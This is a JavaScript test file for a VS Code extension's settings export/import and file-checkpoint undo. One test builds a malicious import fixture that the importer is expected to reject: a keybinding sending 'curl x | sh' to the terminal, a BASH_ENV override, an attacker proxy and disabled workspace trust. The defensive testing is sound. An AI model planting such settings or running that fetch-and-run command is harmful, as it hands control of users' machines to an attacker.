// Export / import of Kural's settings (lib/settings-io.js) and the chat's checkpoints on disk (lib/chat/changes.js).
const assert = require("assert");
const fs = require("fs"), os = require("os"), path = require("path");
const Module = require("module");
const load = Module._load;
let written = [];
Module._load = function (req, ...a) {
  if (req === "vscode") return { EventEmitter: class { constructor() { this.event = () => {}; } fire() {} },
    workspace: { fs: { writeFile: async (uri, buf) => { written.push(uri.fsPath); fs.writeFileSync(uri.fsPath, buf); }, delete: async (uri) => { fs.rmSync(uri.fsPath, { force: true }); } } },
    Uri: { file: (p) => ({ fsPath: p, scheme: "file" }), from: (x) => x } };
  return load.call(this, req, ...a);
};
const io = require("../extension/lib/settings-io");
const { ChangeTracker } = require("../extension/lib/chat/changes");
const pkg = require("../extension/package.json");
let passed = 0, failed = 0;
const check = async (name, fn) => { try { await fn(); passed++; console.log("ok  ", name); } catch (e) { failed++; console.error("FAIL", name, e.stack); } };

(async () => {
  await check("settings.json / keybindings.json with comments and trailing commas", () => {
    const text = `// my settings
{
  "editor.fontSize": 14, /* bigger */
  "workbench.colorTheme": "Kural Dark", // a comment with "quotes" and // slashes
  "files.exclude": { "**/.git": true, },
  "url": "http://localhost:3000/path", // a // inside a string stays
}`;
    assert.deepStrictEqual(io.parseJsonc(text), { "editor.fontSize": 14, "workbench.colorTheme": "Kural Dark", "files.exclude": { "**/.git": true }, url: "http://localhost:3000/path" });
    assert.deepStrictEqual(io.parseJsonc('[{"key":"cmd+k","command":"x"},]'), [{ key: "cmd+k", command: "x" }]);
  });
  await check("Kural's settings: what you set, never program paths (machine-scoped)", () => {
    const values = { "chat.mode": "auto", "modelRouter.profile": "cost", claudePath: "/Users/me/bin/claude", "updates.autoCheck": false };
    const out = io.kuralSettings(pkg, (k) => values[k]);
    assert.deepStrictEqual(out["kural.chat.mode"], "auto"); assert.strictEqual(out["kural.modelRouter.profile"], "cost"); assert.strictEqual(out["kural.updates.autoCheck"], false);
    assert.ok(!("kural.claudePath" in out), "a program path differs per computer");
    for (const k of Object.keys(out)) assert.ok(pkg.contributes.configuration.properties[k].scope !== "machine");
  });
  await check("the file has only the parts you chose; devices without anything secret", () => {
    const data = io.build({ parts: ["kural", "editor", "devices"], packageJSON: pkg, version: "1.2.3", inspect: (k) => k === "chat.mode" ? "plan" : undefined,
      userSettings: { "editor.fontSize": 15, "kural.chat.mode": "plan" }, keybindings: [{ key: "a", command: "b" }], extensions: ["x.y"],
      chat: { model: "opus" }, devices: [{ id: "d1", name: "Pi", host: "10.0.0.2", port: 22, user: "pi", auth: "key", secret: "nope" }] });
    assert.strictEqual(data.format, io.FORMAT); assert.strictEqual(data.from, "Kural 1.2.3");
    assert.deepStrictEqual(data.kural, { "kural.chat.mode": "plan" }); assert.deepStrictEqual(data.editor, { "editor.fontSize": 15 });   // (kural.* only once)
    assert.ok(!data.keybindings && !data.extensions && !data.chat);
    assert.deepStrictEqual(data.devices, [{ id: "d1", name: "Pi", host: "10.0.0.2", port: 22, user: "pi", system: undefined }]);
    const items = io.contents({ ...data, kural: { ...data.kural, "kural.fromTheFuture": 1 } }, pkg);
    assert.deepStrictEqual(items.map((i) => i.id), ["kural", "editor", "devices"]);
    assert.match(items[0].detail, /doesn't know are skipped/);
  });
  await check("JSONC: commas and slashes inside strings stay, a BOM is fine (BUG-5)", () => {
    assert.deepStrictEqual(io.parseJsonc('﻿{"a": "x,}", "b": "y,]", "c": "//no", "d": [1,],}'), { a: "x,}", b: "y,]", c: "//no", d: [1] });
    assert.deepStrictEqual(io.parseJsonc('["a\\"b,]", /* c */ 2,]'), ['a"b,]', 2]);
    assert.strictEqual(io.cleanJsonc("[1, // x\n]").length, "[1, // x\n]".length);
    assert.throws(() => io.parseJsonc("[{ oops"));
  });
  await check("keybindings.json: added at the end, your comments kept; unreadable → throws (nothing written)", () => {
    const text = "// my shortcuts\n[\n  { \"key\": \"cmd+k\", \"command\": \"a\" }, // mine\n]\n";
    const out = io.appendKeybindings(text, [{ key: "cmd+j", command: "b" }]);
    assert.ok(out.includes("// my shortcuts") && out.includes("// mine"), out);
    assert.deepStrictEqual(io.parseJsonc(out), [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b" }]);
    assert.deepStrictEqual(io.parseJsonc(io.appendKeybindings("[ // none yet\n]", [{ key: "x", command: "y" }])), [{ key: "x", command: "y" }]);
    assert.deepStrictEqual(io.parseJsonc(io.appendKeybindings("", [{ key: "x", command: "y" }])), [{ key: "x", command: "y" }]);
    assert.throws(() => io.appendKeybindings("[{ broken", [{ key: "x", command: "y" }]));
    assert.throws(() => io.appendKeybindings("{}", [{ key: "x", command: "y" }]));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kural-kb-")), f = path.join(dir, "keybindings.json");
    fs.writeFileSync(f, "[]", { mode: 0o640 }); io.writeAtomic(f, out);
    assert.strictEqual(fs.readFileSync(f, "utf8"), out); assert.deepStrictEqual(fs.readdirSync(dir), ["keybindings.json"]);
    if (process.platform !== "win32") assert.strictEqual(fs.statSync(f).mode & 0o777, 0o640);   // (Windows has no such modes)
    fs.rmSync(dir, { recursive: true, force: true });
  });
  await check("import never takes program paths, terminal env/profiles, proxy, security, tasks, Auto or terminal shortcuts (APP-3)", () => {
    const evil = { format: io.FORMAT,
      kural: { "kural.claudePath": "/x", "kural.chat.mode": "auto", "kural.fontSize": 15, "__proto__": 1 },
      editor: { "workbench.colorTheme": "Kural Dark", "editor.fontSize": 14, "editor.tokenColorCustomizations": {}, "kural.claudePath": "/evil",
        "terminal.integrated.env.linux": { BASH_ENV: "/tmp/x" }, "terminal.integrated.profiles.osx": {}, "terminal.integrated.defaultProfile.linux": "x",
        "terminal.integrated.shell.linux": "/x", "git.path": "/x", "python.defaultInterpreterPath": "/x", "php.validate.executablePath": "/x",
        "http.proxy": "http://evil:1", "security.workspace.trust.enabled": false, "task.allowAutomaticTasks": "on", "terminal.external.linuxExec": "/x",
        "workbench.externalBrowser": "/x", "launch": {} },
      keybindings: [{ key: "enter", command: "workbench.action.terminal.sendSequence", args: { text: "curl x | sh\n" }, when: "terminalFocus" },
        { key: "f1", command: "runCommands", args: { commands: ["a"] } }, { key: "f2", command: "workbench.action.terminal.new", args: { cwd: "/" } },
        { key: "f3", command: "workbench.action.tasks.runTask", args: "x" }, { key: "f4", command: "editor.action.formatDocument" },
        { key: "f5", command: "workbench.action.terminal.focus" }] };
    const p = io.plan(evil, pkg, []);
    assert.deepStrictEqual(p.kural, [["kural.fontSize", 15]]);
    assert.deepStrictEqual(p.skipped.kural.sort(), ["kural.chat.mode", "kural.claudePath"]);
    assert.deepStrictEqual(p.editor.map(([k]) => k), ["workbench.colorTheme", "editor.fontSize", "editor.tokenColorCustomizations"]);
    assert.deepStrictEqual(p.keybindings.map((b) => b.key), ["f4", "f5"]);
    assert.strictEqual(p.skipped.keybindings.length, 4);
    assert.deepStrictEqual(io.safeChat(JSON.parse('{"mode":"auto","buildMode":"auto","model":"opus","__proto__":{"x":1},"other":2}')), { model: "opus" });
    assert.deepStrictEqual(io.safeChat({ mode: "plan" }), { mode: "plan" });
  });
  await check("export leaves out settings that look secret (APP-4)", () => {
    const dropped = [];
    const data = io.build({ parts: ["editor", "kural"], packageJSON: pkg, version: "1", dropped, inspect: (k) => k === "usageSwitch.limits" ? { claude: { session: 80 } } : undefined,
      userSettings: { "editor.fontSize": 14, "editor.semanticTokenColorCustomizations": { enabled: true }, "github.token": "x", "http.proxyAuthorization": "Basic x",
        "rest-client.environmentVariables": { prod: { apiKey: "k", host: "h" } }, "foo.headers": { Authorization: "Bearer x" }, "my.setting": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "sqltools.connections": [{ password: "p", server: "s" }] } });
    assert.deepStrictEqual(data.editor, { "editor.fontSize": 14, "editor.semanticTokenColorCustomizations": { enabled: true }, "rest-client.environmentVariables": { prod: { host: "h" } }, "foo.headers": {}, "sqltools.connections": [{ server: "s" }] });
    assert.deepStrictEqual(data.kural, { "kural.usageSwitch.limits": { claude: { session: 80 } } });
    assert.strictEqual(dropped.length, 6);
    assert.ok(!/Nothing secret is in the file/.test(fs.readFileSync(require.resolve("../extension/lib/settings-io"), "utf8")));
  });
  await check("imported shortcuts are added after yours, never twice", () => {
    const mine = [{ key: "cmd+k", command: "a" }], theirs = [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b", when: "editorFocus" }, { nonsense: true }];
    assert.deepStrictEqual(io.mergeKeybindings(mine, theirs), [{ key: "cmd+k", command: "a" }, { key: "cmd+j", command: "b", when: "editorFocus" }]);
  });
  await check("checkpoints are saved to disk: Undo works after a restart and after Keep; old ones are cleaned up", async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "kural-ckpt-")), file = path.join(dir, "a.txt");
    fs.writeFileSync(file, "before\n");
    const t1 = new ChangeTracker(path.join(dir, "checkpoints")), turn = { snaps: {} };
    t1.snapshot(turn, file);
    fs.writeFileSync(file, "after\n");
    const [change] = t1.summary(turn, dir);
    assert.ok(change && change.after);
    assert.ok(t1.unchangedSince(file, change.after));
    t1.keep(change.id);                                  // Keep doesn't drop the checkpoint
    const t2 = new ChangeTracker(path.join(dir, "checkpoints"));   // "Kural restarted"
    assert.strictEqual(await t2.undo(change.id), true);
    assert.strictEqual(fs.readFileSync(file, "utf8"), "before\n");
    assert.ok(!t2.unchangedSince(file, change.after));   // the file isn't as the AI left it any more
    // A new file the AI created: undo deletes it.
    const created = path.join(dir, "new.txt"), turn2 = { snaps: {} };
    t2.snapshot(turn2, created); fs.writeFileSync(created, "x");
    const [c2] = t2.summary(turn2, dir); assert.strictEqual(c2.created, true);
    await t2.undo(c2.id); assert.ok(!fs.existsSync(created));
    // Cleanup: older than the limit goes.
    const old = path.join(dir, "checkpoints", `${change.id}.json`), past = new Date(Date.now() - 40 * 86400000);
    fs.utimesSync(old, past, past); t2.cleanup(30); assert.ok(!fs.existsSync(old));
    assert.strictEqual(new ChangeTracker(path.join(dir, "checkpoints")).get(change.id), null);
    fs.rmSync(dir, { recursive: true, force: true });
  });
  console.log(`settings-io: ${passed} passed, ${failed} failed`); process.exitCode = failed ? 1 : 0;
})();
